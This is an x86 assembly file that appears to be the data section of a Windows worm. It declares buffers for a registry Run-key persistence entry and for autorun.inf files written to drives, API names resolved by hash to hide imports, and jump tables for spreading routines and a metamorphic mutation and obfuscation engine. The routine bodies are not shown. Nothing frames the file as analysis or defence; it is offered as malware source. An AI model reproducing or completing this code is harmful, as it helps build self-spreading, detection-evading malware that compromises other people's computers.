
	DataStartInMemory EQU DataStart
	CodeStartInMemory EQU 0x00402000
	DataStartInFile EQU 0x200
	CodeStartInFile EQU 0x600


	stKey: times 47 db 0x0 ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0x0
	hKey  dd 0x0

	NopTmp: dd 0x0

	stAutoRunContent: times 52 db 0x0
	stAutorunWithDrive db 0x0, 0x0, 0x0	; "X:\"
	stAutoruninf: times 12 db 0x0		; "autorun.inf"

	hCreateFileRndFile dd 0x0
	dFileSize	   dd 0x0
	hCreateMapRndFile  dd 0x0
	hMapViewRndFile    dd 0x0

	FileCodeSize dd (endcode-startcode)

	WormCodeStart	dd 0x0
	WormDataStart	dd 0x0
	VA_BlankCode	dd 0x0
	VA_CodeSize	dd 0x0
	VA_Registers	dd 0x0

	RandomNumber	   dd 0x0
	hMyFileName	   dd 0x0
	SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
	RandomFileName: times 13 db 0x0

	SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
	RandomFileName2:times 13 db 0x0

	hCreateFileAR	     dd 0x0
	hCreateFileMappingAR dd 0x0

	_DLLkernel32:	 times 13 db 0x0
	hDLLkernel32	 dd 0x0

	_DLLadvapi32:	 times 13 db 0x0
	hDLLadvapi32	 dd 0x0

	hKernelPE    dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0



	APINumbersKernel EQU (APIMagicNumbersKernel32End-APIMagicNumbersKernel32)/4

	APIMagicNumbersKernel32:
;                hashAddVectoredExceptionHandler dd 0x85D3
						    ; The VEH APIs are directly redirected to ntdll, so the entry in the AddressTable is not valid
						    ; this counts for XP, Vista and probably Vista+, too
		hashCloseHandle     dd 0xA2C8
		hashCopyFileA	    dd 0x8ADF
		hashCreateFileA     dd 0x89DE
		hashCreateFileMappingA dd 0xD198
		hashGetCommandLineA dd 0x8287
		hashGetDriveTypeA   dd 0x6586
		hashGetFileSize     dd 0x87DF
		hashGetTickCount    dd 0xEBAE
		hashMapViewOfFile   dd 0xA6D0
;                hashRemoveVectoredExceptionHandler dd 0xB98C
		hashSetErrorMode    dd 0xCF8D
		hashSleep	    dd 0x6EAA
		hashUnmapViewOfFile dd 0xA5F9
		hashVirtualAlloc    dd 0xC563
		hashVirtualFree     dd 0x88F0
		hashVirtualProtect  dd 0xAE67
	APIMagicNumbersKernel32End:

	APIAddressesKernel:
;                _AddVectoredExceptionHandler dd 0x0
		_CloseHandle	 dd 0x0
		_CopyFileA	 dd 0x0
		_CreateFileA	 dd 0x0
		_CreateFileMappingA dd 0x0
		_GetCommandLineA dd 0x0
		_GetDriveTypeA	 dd 0x0
		_GetFileSize	 dd 0x0
		_GetTickCount	 dd 0x0
		_MapViewOfFile	 dd 0x0
;                _RemoveVectoredExceptionHandler dd 0x0
		_SetErrorMode	 dd 0x0
		_Sleep		 dd 0x0
		_UnmapViewOfFile dd 0x0
		_VirtualAlloc	 dd 0x0
		_VirtualFree	 dd 0x0
		_VirtualProtect  dd 0x0

	APINumbersAdvapi EQU (APIMagicNumbersAdvapi32End-APIMagicNumbersAdvapi32)/4

	APIMagicNumbersAdvapi32:
		hashRegCloseKey       dd 0x84C2
		hashRegCreateKeyExA   dd 0xAC9F
		hashRegSetValueExA    dd 0xC655
	APIMagicNumbersAdvapi32End:

	APIAddressesAdvapi:
		_RegCloseKey	  dd 0x0
		_RegCreateKeyExA  dd 0x0
		_RegSetValueExA   dd 0x0



	APICurrentMagicNum dd 0x0
	APICurrentNumber   dd 0x0
	APICurrentAddress  dd 0x0

; Will be changed
db 'XXXX'
lVariableJmpTableStart:
	lendcode dd endcode
	lFileNameIsFine dd FileNameIsFine
	lFindFileNameLoop dd FindFileNameLoop
	lGetRandomNumber   dd GetRandomNumber
	lFindAPIsInLibrary dd FindAPIsInLibrary
	lFindAPIsInLibraryGetNextAPI dd FindAPIsInLibraryGetNextAPI
	lFindAPIsInLibraryNext dd FindAPIsInLibraryNext
	lFindAPIGiveMeTheHashMore dd FindAPIGiveMeTheHashMore
	lCopyFileAndRegEntryMore dd CopyFileAndRegEntryMore
	lMakeAutoRunInfoMore dd MakeAutoRunInfoMore
	lSTKWithAutoRun dd STKWithAutoRun
	lSTKWithoutAutoRun dd STKWithoutAutoRun
	lSTKCreateEntriesForNextDrive dd STKCreateEntriesForNextDrive
	lSpreadThisKittyEnd dd SpreadThisKittyEnd
	lSTKAnotherRound dd STKAnotherRound
	lMainSpreadingLoop dd MainSpreadingLoop
	lOpenRandomFileWrite dd OpenRandomFileWrite
	lCloseRandomFile   dd CloseRandomFile
	lMutateFile	   dd MutateFile
	lDeobfuscator_WroteInstr	dd Deobfuscator_WroteInstr
	lAnalyseGotInstrFin dd AnalyseGotInstrFin
	lGetRegisterCode dd GetRegisterCode
	lAnalyseGotDouble___Reg dd AnalyseGotDouble___Reg
	lEndGetRandomRegister dd EndGetRandomRegister
	lNoMutate dd NoMutate
	lMutationWithJmp dd MutationWithJmp
	lMutateNextInstruction dd MutateNextInstruction
	lObfuscatorWriteMoreUnObfuscatedCode dd ObfuscatorWriteMoreUnObfuscatedCode
	lGetRandomRegister dd GetRandomRegister
	lGetRegisterCodeInv dd GetRegisterCodeInv
	lEndGetRegisterCode dd EndGetRegisterCode
	lEndReturnRegisterCode dd EndReturnRegisterCode
	lAdjustJumpTable_NoAdjust dd AdjustJumpTable_NoAdjust
	lAdjustJumpTableNextAddress dd AdjustJumpTableNextAddress
	lDeobfuscate2Byte dd Deobfuscate2Byte
	lDeobfuscate1Byte dd Deobfuscate1Byte
	lDeobfuscateFoundPUSH_RET dd DeobfuscateFoundPUSH_RET
	lDeobfuscateFoundPUSH_RET_FinWrite dd DeobfuscateFoundPUSH_RET_FinWrite
	lDeobfuscateMore dd DeobfuscateMore
	lDeobfuscateWriteMore dd DeobfuscateWriteMore
	lFinishedThisInstruction dd FinishedThisInstruction
	lAnalyseGotCmpRegReg dd AnalyseGotCmpRegReg
	lAnalyseGotDoubleRegReg dd AnalyseGotDoubleRegReg
	lAnalyseGotJxx dd AnalyseGotJxx
	lAnalyseGotSingleByteFindReg dd AnalyseGotSingleByteFindReg
	lAnalyseFileCode dd AnalyseFileCode
	lAnalyseGotCmpReg8Reg8 dd AnalyseGotCmpReg8Reg8
	lAnalyseGotDouble___Reg8 dd AnalyseGotDouble___Reg8
	lGetRegisterCode8 dd GetRegisterCode8
	lEndGetRegisterCode8 dd EndGetRegisterCode8
	lAnalyseGotDoubleReg8Reg32 dd AnalyseGotDoubleReg8Reg32
	lAdjustJumpTable dd AdjustJumpTable
lVariableJmpTableEnd:


; Constant for the deobfuscated version
l2ConstJmpTableStart:
	l2endcode dd endcode
	l2FileNameIsFine dd FileNameIsFine
	l2FindFileNameLoop dd FindFileNameLoop
	l2GetRandomNumber   dd GetRandomNumber
	l2FindAPIsInLibrary dd FindAPIsInLibrary
	l2FindAPIsInLibraryGetNextAPI dd FindAPIsInLibraryGetNextAPI
	l2FindAPIsInLibraryNext dd FindAPIsInLibraryNext
	l2FindAPIGiveMeTheHashMore dd FindAPIGiveMeTheHashMore
	l2CopyFileAndRegEntryMore dd CopyFileAndRegEntryMore
	l2MakeAutoRunInfoMore dd MakeAutoRunInfoMore
	l2STKWithAutoRun dd STKWithAutoRun
	l2STKWithoutAutoRun dd STKWithoutAutoRun
	l2STKCreateEntriesForNextDrive dd STKCreateEntriesForNextDrive
	l2SpreadThisKittyEnd dd SpreadThisKittyEnd
	l2STKAnotherRound dd STKAnotherRound
	l2MainSpreadingLoop dd MainSpreadingLoop
	l2OpenRandomFileWrite dd OpenRandomFileWrite
	l2CloseRandomFile   dd CloseRandomFile
	l2MutateFile	    dd MutateFile
	l2Deobfuscator_WroteInstr	 dd Deobfuscator_WroteInstr
	l2AnalyseGotInstrFin dd AnalyseGotInstrFin
	l2GetRegisterCode dd GetRegisterCode
	l2AnalyseGotDouble___Reg dd AnalyseGotDouble___Reg
	l2EndGetRandomRegister dd EndGetRandomRegister
	l2NoMutate dd NoMutate
	l2MutationWithJmp dd MutationWithJmp
	l2MutateNextInstruction dd MutateNextInstruction
	l2ObfuscatorWriteMoreUnObfuscatedCode dd ObfuscatorWriteMoreUnObfuscatedCode
	l2GetRandomRegister dd GetRandomRegister
	l2GetRegisterCodeInv dd GetRegisterCodeInv
	l2EndGetRegisterCode dd EndGetRegisterCode
	l2EndReturnRegisterCode dd EndReturnRegisterCode
	l2AdjustJumpTable_NoAdjust dd AdjustJumpTable_NoAdjust
	l2AdjustJumpTableNextAddress dd AdjustJumpTableNextAddress
	l2Deobfuscate2Byte dd Deobfuscate2Byte
	l2Deobfuscate1Byte dd Deobfuscate1Byte
	l2DeobfuscateFoundPUSH_RET dd DeobfuscateFoundPUSH_RET
	l2DeobfuscateFoundPUSH_RET_FinWrite dd DeobfuscateFoundPUSH_RET_FinWrite
	l2DeobfuscateMore dd DeobfuscateMore
	l2DeobfuscateWriteMore dd DeobfuscateWriteMore
	l2FinishedThisInstruction dd FinishedThisInstruction
	l2AnalyseGotCmpRegReg dd AnalyseGotCmpRegReg
	l2AnalyseGotDoubleRegReg dd AnalyseGotDoubleRegReg
	l2AnalyseGotJxx dd AnalyseGotJxx
	l2AnalyseGotSingleByteFindReg dd AnalyseGotSingleByteFindReg
	l2AnalyseFileCode dd AnalyseFileCode
	l2AnalyseGotCmpReg8Reg8 dd AnalyseGotCmpReg8Reg8
	l2AnalyseGotDouble___Reg8 dd AnalyseGotDouble___Reg8
	l2GetRegisterCode8 dd GetRegisterCode8
	l2EndGetRegisterCode8 dd EndGetRegisterCode8
	l2AnalyseGotDoubleReg8Reg32 dd AnalyseGotDoubleReg8Reg32
	l2AdjustJumpTable dd AdjustJumpTable
l2ConstJmpTableEnd:

	WatchFlags db 0x0    ; If !0 -> Dont use Flag operations


	InstrRestriction dd 0x0    ; ????'???1b -> dont use Stack for mutation

	times 100: db 0x0